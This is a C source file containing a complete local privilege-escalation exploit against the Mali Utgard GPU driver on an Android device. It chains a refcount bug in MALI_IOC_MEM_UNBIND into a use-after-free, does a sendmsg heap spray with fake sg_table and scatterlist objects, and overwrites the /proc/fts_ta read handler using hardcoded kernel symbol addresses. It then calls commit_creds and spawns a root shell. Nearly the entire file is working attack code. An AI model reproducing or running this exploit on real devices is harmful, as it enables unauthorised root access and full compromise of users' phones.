#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 

#define EXPLOIT_ATTEMPTS 10 // number of tries to try the exploit before giving up

// Mali definitions
#define MALI_IOC_BASE           0x82
#define _MALI_UK_MEMORY_SUBSYSTEM    1
#define MALI_IOC_MEMORY_BASE    (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)

#define _MALI_UK_ALLOC_MEM      0
#define _MALI_UK_FREE_MEM       1
#define _MALI_UK_UNBIND_MEM     3

#define MALI_IOC_MEM_ALLOC                  _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, _mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_FREE                   _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, _mali_uk_free_mem_s)
#define MALI_IOC_MEM_UNBIND                 _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, _mali_uk_unbind_mem_s)

typedef struct {
    uint64_t ctx;                   // [in,out] user-kernel context
    uint32_t gpu_vaddr;             // [in] GPU virtual address  
    uint32_t vsize;                 // [in] virtual size of the allocation
    uint32_t psize;                 // [in] physical size of the allocation
    uint32_t flags;                 // [in] allocation flags
    uint64_t backend_handle;        // [out] backend handle
    int32_t secure_shared_fd;       // [in] the mem handle for secure mem
} _mali_uk_alloc_mem_s;

typedef struct {
	uint64_t ctx;                      /**< [in,out] user-kernel context (trashed on output) */
	uint32_t gpu_vaddr;                /**< [in] use as handle to free allocation */
	uint32_t free_pages_nr;      /** < [out] record the number of free pages */
} _mali_uk_free_mem_s;

typedef struct {
    uint64_t ctx;                // User-kernel context
    uint32_t flags;              // Flags
    uint32_t vaddr;              // Mali address
} _mali_uk_unbind_mem_s;

typedef struct {
    void *addr;
    size_t size;
    int success;
} mmap_result_t;


// Ion definitions
#define ION_IOC_MAGIC		'I'
#define ION_IOC_ALLOC		_IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE		_IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE		_IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

// Hardcoded kernel symbol addresses
#define PREPARE_KERNEL_CRED_ADDR 0xc013fbe4
#define COMMIT_CREDS_ADDR        0xc013f638

// ION structures
struct ion_allocation_data {
    uint32_t len;
    uint32_t align;
    uint32_t heap_id_mask;
    uint32_t flags;
    int handle;
};

struct ion_handle_data {
    int handle;
};

struct ion_fd_data {
    int handle;
    int fd;
};


// Exploit definitions
#define SPRAY_BUFF_SIZE     60

// memory read/write primitive properties
#define TARGET_PFN          0x80b8c     // No KASLR in this kernel, so easy to get this from the virtual address (0xc -> 0x8, divide by page size (0x1000))
#define MEM_MAP_BASE        0xdf802000  // where the map_base is, can find it by looking at last_kmsg and specifying 0x41414141 as scatterlist ptr

typedef struct cred *(*prepare_kernel_cred_t)(void *);
typedef int (*commit_creds_t)(struct cred *);

struct scatterlist {
    unsigned long page_link;
    unsigned int offset;
    unsigned int length;
    unsigned long dma_address;
};

struct sg_table { 
	struct scatterlist *sgl; 
	unsigned int nents; 
	unsigned int orig_nents; 
};

// Buffer tracking structure
typedef struct {
    int handle_or_fd;
    size_t size;
    int allocated;
    void *mapped_addr;   // For mapping ION buffers
    int shared_fd;       // For ION shared fd
} buffer_info_t;


// exploit won't work without this ;)
void important_ascii_art() {
    printf("\033[97m\n");
    printf("███    ███ ██ ███    ██ ███    ██ ██   ██  █████  \n");
    printf("\033[38;5;159m");
    printf("████  ████ ██ ████   ██ ████   ██ ██  ██  ██   ██ \n");
    printf("\033[38;5;117m");
    printf("██ ████ ██ ██ ██ ██  ██ ██ ██  ██ █████   ███████ \n");
    printf("\033[38;5;75m");
    printf("██  ██  ██ ██ ██  ██ ██ ██  ██ ██ ██  ██  ██   ██ \n");
    printf("\033[38;5;33m");
    printf("██      ██ ██ ██   ████ ██   ████ ██   ██ ██   ██\n");
    printf("\033[0m");
}


_mali_uk_alloc_mem_s mali_alloc_memory(int mali_fd, _mali_uk_alloc_mem_s input) {
    _mali_uk_alloc_mem_s result = input;
    
    int ret = ioctl(mali_fd, MALI_IOC_MEM_ALLOC, &result);
    
    if (ret == -1) {
        printf("  ERROR: %s (errno: %d)\n", strerror(errno), errno);
    }
    
    return result;
}


int map_ion_buffer(int ion_fd, buffer_info_t* buffer_info) {
    if (!buffer_info->allocated) {
        return -1; // Not an ION buffer
    }
    
    // Get shared fd for the ION buffer
    struct ion_fd_data fd_data = {0};
    fd_data.handle = buffer_info->handle_or_fd;
    fd_data.fd = -1;
    
    int ret = ioctl(ion_fd, ION_IOC_SHARE, &fd_data);
    if (ret != 0) {
        printf("    [ION] Failed to get shared fd for handle %d: %s\n", 
               buffer_info->handle_or_fd, strerror(errno));
        return -1;
    }
    
    buffer_info->shared_fd = fd_data.fd;
    printf("    [ION] Got shared fd=%d for handle=%d\n", fd_data.fd, buffer_info->handle_or_fd);
    
    // mmap the ION buffer using the shared fd
    void *mapped_addr = mmap(NULL, buffer_info->size, PROT_READ | PROT_WRITE, 
                            MAP_SHARED, fd_data.fd, 0);
    
    if (mapped_addr == MAP_FAILED) {
        printf("    [ION] mmap failed for fd=%d: %s\n", fd_data.fd, strerror(errno));
        close(fd_data.fd);
        buffer_info->shared_fd = -1;
        return -1;
    }
    
    buffer_info->mapped_addr = mapped_addr;
    printf("    [ION] Mapped buffer: addr=%p, size=%zu\n", mapped_addr, buffer_info->size);
    return 0;
}


void unmap_ion_buffer(buffer_info_t* buffer_info) {
    if (buffer_info->mapped_addr) {
        munmap(buffer_info->mapped_addr, buffer_info->size);
        buffer_info->mapped_addr = NULL;
        printf("    [ION] Unmapped buffer\n");
    }
    
    if (buffer_info->shared_fd >= 0) {
        close(buffer_info->shared_fd);
        buffer_info->shared_fd = -1;
        printf("    [ION] Closed shared fd\n");
    }
}


int alloc_ion_buffer(int ion_fd, size_t size, buffer_info_t* buffer_info) {
    // Try ION first
    if (ion_fd < 0) {
        return 0;
    }

    struct ion_allocation_data alloc_data = {0};
    alloc_data.len = size;
    alloc_data.align = 0;
    alloc_data.heap_id_mask = 2;  // Use heap 1
    alloc_data.flags = 0;
    alloc_data.handle = 0;
    
    int ret = ioctl(ion_fd, ION_IOC_ALLOC, &alloc_data);
    
    if (ret == 0) {
        buffer_info->handle_or_fd = alloc_data.handle;
        buffer_info->size = size;
        buffer_info->allocated = 1;
        buffer_info->mapped_addr = NULL;
        buffer_info->shared_fd = -1;
        return 0;
    }
    printf("    [ERROR] ION allocation failed for size=%zu\n", size);
    buffer_info->allocated = 0;
    return -1;
}


void free_ion_kernel_buffer(int ion_fd, buffer_info_t* buffer_info) {
    if (!buffer_info->allocated) {
        return;
    }

    if (ion_fd >= 0) {
        struct ion_handle_data free_data = {0};
        free_data.handle = buffer_info->handle_or_fd;
        
        int ret = ioctl(ion_fd, ION_IOC_FREE, &free_data);
    }
    
    buffer_info->allocated = 0;
}

void free_mali_buffer(int mali_fd, uint64_t ctx, unsigned int gpu_vaddr){
    // Prepare free parameters
    _mali_uk_free_mem_s free_params;
    memset(&free_params, 0, sizeof(free_params));
    free_params.ctx = ctx;
    free_params.gpu_vaddr = gpu_vaddr;
    
    // Try to free the memory while mmap is in progress
    int result = ioctl(mali_fd, MALI_IOC_MEM_FREE, &free_params);
}


mmap_result_t* mali_mmap_allocation_multiple_times(int mali_fd, uint32_t gpu_vaddr, uint32_t count) {
    mmap_result_t* mappings = malloc(sizeof(mmap_result_t) * count);
    if (!mappings) {
        printf("[-] Failed to allocate memory for %u mmap results\n", count);
        return NULL;
    }
    
    printf("[+] Memory mapping GPU address 0x%08x %d times...\n", gpu_vaddr, count);
    
    uint32_t successful = 0;
    for (uint32_t i = 0; i < count; i++) {
        // mmap the Mali allocation using its GPU virtual address as offset
        // The GPU virtual address becomes the offset for mmap
        void *mapped_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, 
                                mali_fd, gpu_vaddr);
        
        mappings[i].size = 4096;
        
        if (mapped_addr == MAP_FAILED) {
            mappings[i].addr = NULL;
            mappings[i].success = 0;
        } else {
            mappings[i].addr = mapped_addr;
            mappings[i].success = 1;
            successful++;
        }
    }
    
    return mappings;
}


void mali_cleanup_mappings_to_do_decrement_on_uaf_obj(mmap_result_t* mappings, uint32_t count) {
    printf("[+] Cleaning up %u mappings... (a.k.a decrementing sg_table by %u)\n", count, count);
    
    for (uint32_t i = 0; i < count; i++) {
        if (mappings[i].success && mappings[i].addr) {
            if (munmap(mappings[i].addr, mappings[i].size) == 0) {
                // printf("  [%u] Unmapped %p\n", i, mappings[i].addr);
            } else {
                printf("  [%u] Failed to unmap %p: %s\n", i, mappings[i].addr, strerror(errno));
            }
        }
    }
    
    free(mappings);
}


// we overwrite the read() syscall handler for this, so calling this will cause the kernel to execute our code (no SMEP <3)
int trigger_fts_ta_read() {
    const char *dev_path = "/proc/fts_ta";
    char buffer[1024];
    int fd;
    
    // Check if the file exists
    if (access(dev_path, F_OK) != 0) {
        return 1;
    }
    
    // Try to open the device normally
    fd = open(dev_path, O_RDONLY);
    if (fd < 0) {
        return 1;
    }

    // Try a small read
    ssize_t bytes_read = read(fd, buffer, sizeof(buffer));
    if (bytes_read < 0) {
        printf("[-] Read failed with error: %s\n", strerror(errno));
    }
    
    close(fd);
    
    return 0;
}


// util function for hexdumping ion buffer contents
void hexdump(const void* data, size_t size, const char* prefix) {
    const unsigned char* bytes = (const unsigned char*)data;
    size_t i, j;
    
    printf("%s Hexdump (%zu bytes):\n", prefix, size);
    
    for (i = 0; i < size; i += 16) {
        // Print offset
        printf("%s %08zx: ", prefix, i);
        
        // Print hex values
        for (j = 0; j < 16; j++) {
            if (i + j < size) {
                printf("%02x ", bytes[i + j]);
            } else {
                printf("   ");
            }
            // Add extra space after 8 bytes
            if (j == 7) printf(" ");
        }
        
        printf(" |");
        
        // Print ASCII representation
        for (j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = bytes[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        
        printf("|\n");
    }
    printf("\n");
}


// function to be executed by the kernel to escalate privileges
void get_root_shell() {
    prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;
    commit_creds_t commit_creds = (commit_creds_t)COMMIT_CREDS_ADDR;

    commit_creds(prepare_kernel_cred(NULL));
}

int main() {
    important_ascii_art();

    for (int attempt = 0; attempt < EXPLOIT_ATTEMPTS; attempt++){
        printf("\n\033[38;5;159m~~~~~~~~~~~~ ATTEMPT %d ~~~~~~~~~~~~\033[0m\n", attempt + 1);

        int mali_fd, ion_fd;

        // constants
        uint32_t mmap_count = 0x110;                            // Number of times to map mali object (limit for decrement)
        uint32_t uaf_ion_alloc_count = 1;                       // Number of ion allocations sprayed for the UAF (doesnt matter which one lands really)
        uint32_t decrement_value = 0xb0;                        // Number of munmap to call on mali allocation (to decrement the address in the UAF ion_buffer)
        uint32_t spray_count = 10000;                           // Number of ion buffers to create to try and land a fake sg_table before the legit one
        uint32_t kmalloc_64_count = spray_count / 100;          // Number of times to free sg_tables (and assoicated ion_buffer) in kmalloc-64
        uint32_t step_count = spray_count / kmalloc_64_count;   // Gaps between sg_tables that get free'd in kmalloc-64

        // Calculate page pointer
        struct page *page = (struct page *)(MEM_MAP_BASE + (TARGET_PFN - 0x80000) * 32);
        unsigned long page_link = (unsigned long)page;

        // construct fake scatterlist object (fake sg_table will point to this)
        struct scatterlist fake_scatterlist;
        fake_scatterlist.page_link = page_link;  // Store PFN shifted back
        fake_scatterlist.offset = 0;
        fake_scatterlist.length = 0x1000;
        fake_scatterlist.dma_address = 0x0;

        // construct fake sg_table object (we will modify legit pointer to point to this)
        struct sg_table fake_sg_table;
        fake_sg_table.sgl = &fake_scatterlist;
        fake_sg_table.nents = 1;
        fake_sg_table.orig_nents = 1;


        // init the tracking buffers for spray/exploit
        buffer_info_t* ion_buffers_for_tracking = malloc(sizeof(buffer_info_t) * (uaf_ion_alloc_count + spray_count));
        memset(ion_buffers_for_tracking, 0, sizeof(buffer_info_t) * (uaf_ion_alloc_count + spray_count));

        _mali_uk_alloc_mem_s* mali_buffers_for_tracking = malloc(sizeof(_mali_uk_alloc_mem_s) * kmalloc_64_count);
        memset(mali_buffers_for_tracking, 0x0, sizeof(_mali_uk_alloc_mem_s) * kmalloc_64_count);
        for (uint32_t i = 0; i < kmalloc_64_count; i++){
            mali_buffers_for_tracking[i].ctx = 0;
            mali_buffers_for_tracking[i].gpu_vaddr = 0x1000 + (i * 0x1000);
            mali_buffers_for_tracking[i].vsize = 4096;
            mali_buffers_for_tracking[i].psize = 4096;
            mali_buffers_for_tracking[i].flags = 0x0;
            mali_buffers_for_tracking[i].backend_handle = 0;
            mali_buffers_for_tracking[i].secure_shared_fd = -1;
        }


        // Open the Mali device
        mali_fd = open("/dev/mali", O_RDWR);
        if (mali_fd < 0) {
            perror("[-] Failed to open /dev/mali");
            return -1;
        }
        printf("[+] Successfully opened /dev/mali (fd=%d)\n", mali_fd);
        
        // Try to open the ION device (may not exist)
        ion_fd = open("/dev/ion", O_RDWR);
        if (ion_fd < 0) {
            printf("[-] Failed to open /dev/ion\n");
            return -1;
        }
        printf("[+] Successfully opened /dev/ion (fd=%d)\n", ion_fd);



        // STEP 1: Use MALI_IOC_MEM_ALLOC to create mali_alloc object in kmalloc-128
        printf("\n[1] Allocate victim mali_alloc\n");
        _mali_uk_alloc_mem_s victim_mali_alloc_input = {0};
        victim_mali_alloc_input.ctx = 0;
        victim_mali_alloc_input.gpu_vaddr = 0x0;
        victim_mali_alloc_input.vsize = 4096;
        victim_mali_alloc_input.psize = 4096;
        victim_mali_alloc_input.flags = 0x0;
        victim_mali_alloc_input.backend_handle = 0;
        victim_mali_alloc_input.secure_shared_fd = -1;
        
        _mali_uk_alloc_mem_s result = mali_alloc_memory(mali_fd, victim_mali_alloc_input);
        
        printf("[+] Mali allocation successful!\n");
        printf("    GPU VAddr: 0x%08x\n", result.gpu_vaddr);
        printf("    Backend Handle: 0x%016llx\n", result.backend_handle);

        

        // STEP 2: Do multiple mmaps on this to increment the refcount associated with the mali_alloc object
        // For mmap, we need to use the gpu_vaddr as offset
        printf("\n[2] Doing %d mali_alloc mmaps\n", mmap_count);

        uint32_t victim_mmap_offset = result.gpu_vaddr;
        mmap_result_t* mappings = mali_mmap_allocation_multiple_times(mali_fd, victim_mmap_offset, mmap_count);
        


        // STEP 3: PIN SENDMSG CONTROLLED MEMORY INTO HEAP USING SG_TABLE VIA ION_BUFFER
        printf("\n[3] Doing kmalloc-64 sendmsg heap spray + pinning %d times\n", spray_count);
        
        // init stuff for the sendmsg spray
        char buff[SPRAY_BUFF_SIZE];
        struct msghdr msg = {0};
        struct sockaddr_in addr = {0};
        int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

        // populate the buffer with a fake sg_table
        memcpy(buff + 0x10, &fake_sg_table, sizeof(struct sg_table));

        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_family = AF_INET;
        addr.sin_port = htons(6666);

        msg.msg_control = buff;
        msg.msg_controllen = SPRAY_BUFF_SIZE; 

        msg.msg_name = (caddr_t)&addr;
        msg.msg_namelen = sizeof(addr);

        /* Heap spray + sg_table pinning */
        for(int i = 0; i < spray_count; i++) {
            sendmsg(sockfd, &msg, 0);
            int alloc_ret = alloc_ion_buffer(ion_fd, 4096, &ion_buffers_for_tracking[i]);
        }
        


        // STEP 4: BLOW A FEW HOLES IN THE KMALLOC-64 CACHE + KMALLOC-128 CACHE, REFILL KMALLOC-128 HOLES WITH MALI_ALLOC OBJECTS
        printf("\n[4] Making %d Holes in kmalloc-64\n", kmalloc_64_count);
        uint32_t mali_buffer_count = 0;
        for (uint32_t i = 0; i < spray_count; i += step_count) {
            if (ion_buffers_for_tracking[i].allocated) {
                free_ion_kernel_buffer(ion_fd, &ion_buffers_for_tracking[i]); // blow hole in kmalloc-128 and kmalloc-64
                _mali_uk_alloc_mem_s result = mali_alloc_memory(mali_fd, mali_buffers_for_tracking[mali_buffer_count]); // fill hole created in kmalloc-128
                mali_buffer_count++;
            }
        }
        


        // STEP 5: NOW USE THE BUG TO DECREMENT THE REFCOUNT IN THE VICTIM OBJECT TO JUST BEFORE UAF
        printf("\n[5] Calling MALI_IOC_MEM_UNBIND on victim %d times\n", mmap_count);
        
        _mali_uk_unbind_mem_s unbind_params;
        memset(&unbind_params, 0, sizeof(unbind_params));
        unbind_params.ctx = result.ctx;
        unbind_params.vaddr = result.gpu_vaddr;
        unbind_params.flags = 0x100; // _MALI_MEMORY_BIND_BACKEND_UMP
        
        for (uint32_t i = 0; i < mmap_count; i++) {
            int ioc_result = ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
        }

        

        // STEP 6: TRIGGER THE UAF AND REPLACE MALI_ALLOC WITH ION_BUFFER (MIGHT TAKE A FEW ATTEMPTS BUT ONLY NEEDS TO LAND ONCE)
        // ALSO HOPE THAT THE SG_TABLE LANDS IN A HOLE WE CREATED WITH OTHERS NEARBY!
        printf("\n[6] Attempting to land UAF with %u UNBIND + ion_buffer allocation cycle(s)\n", uaf_ion_alloc_count);
        
        for (uint32_t i = spray_count; i < spray_count + uaf_ion_alloc_count; i++) {
            ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
            alloc_ion_buffer(ion_fd, 4096, &ion_buffers_for_tracking[i]);
        }



        // STEP 7: CALL MUNMAP ON THE VICTIM TO DECREMENT THE TARGET POINTER IN THE UAF OBJECT
        printf("\n[7] Decrementing pointer in UAF object (ion_buffer.sg_table hopefully)\n");
        mali_cleanup_mappings_to_do_decrement_on_uaf_obj(mappings, decrement_value);



        // STEP 8: HOPE THE DECREMENT AND SG_TABLE SPRAY WORKED, SHOULD MAGICALLY POP ROOT SHELL PLZ
        printf("\n[8] Attempting to map corrupted ion_buffer\n");
        for (uint32_t i = spray_count; i < spray_count + uaf_ion_alloc_count; i++) {
            if (ion_buffers_for_tracking[i].allocated) {
                printf("[+] Mapping ION buffer %u (handle=%d)...\n", i, ion_buffers_for_tracking[i].handle_or_fd);
                if (map_ion_buffer(ion_fd, &ion_buffers_for_tracking[i]) == 0) {
                    // Hexdump the mapped buffer contents
                    if (ion_buffers_for_tracking[i].mapped_addr && ion_buffers_for_tracking[i].size > 0) {
                        printf("[+] ION buffer %u first 0x80 bytes:\n", i);
                        hexdump(ion_buffers_for_tracking[i].mapped_addr, 0x80, "    ");
                        
                        printf("[9] Attempting to overwrite fts_ta read pointer...\n");
                        uint32_t* thing = (uint32_t*) ion_buffers_for_tracking[i].mapped_addr;
                        thing[0x89c / 4] = (uint32_t)(uintptr_t)&get_root_shell;
                    }
                }
            }
        }



        // STEP 9 : Cleanup - Free kernel buffers (this releases the references)
        printf("\n[10] Cleaning up shop\n");

        // free the sprayed ion buffers
        for (uint32_t i = 0; i < spray_count + uaf_ion_alloc_count; i++) {
            if (ion_buffers_for_tracking[i].allocated) {
                free_ion_kernel_buffer(ion_fd, &ion_buffers_for_tracking[i]);
            }
        }
        printf("[+] Freed sprayed ion buffers\n");

        // free the sprayed mali allocations
        for (uint32_t i = 0; i < kmalloc_64_count; i++) {
            free_mali_buffer(mali_fd, mali_buffers_for_tracking[i].ctx, mali_buffers_for_tracking[i].gpu_vaddr);
        }
        printf("[+] Freed sprayed mali buffers\n");
        
        // Free the tracking array
        free(ion_buffers_for_tracking);
        
        // Close the devices
        close(ion_fd);
        close(mali_fd);
        printf("[+] Closed mali and ion\n");
        

        // STEP 10 - Trigger the overwritten function pointer to escalate to root
        printf("\n[11] Triggering overwritten callback for privesc\n");
        trigger_fts_ta_read(); // should run payload

        printf("[*] Checking if we are root...\n");
        if (getuid() == 0) {
            printf("[+] We're root after %d attempt(s)! Popping shell...\n", attempt + 1);
            break;
        } else {
            printf("[-] We're not root yet :(\n");
            sleep(1);
        }
    }

    if (getuid() == 0) {
        char* shell = "/system/bin/sh";
        char* args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    } else {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }
    
    return 0;
}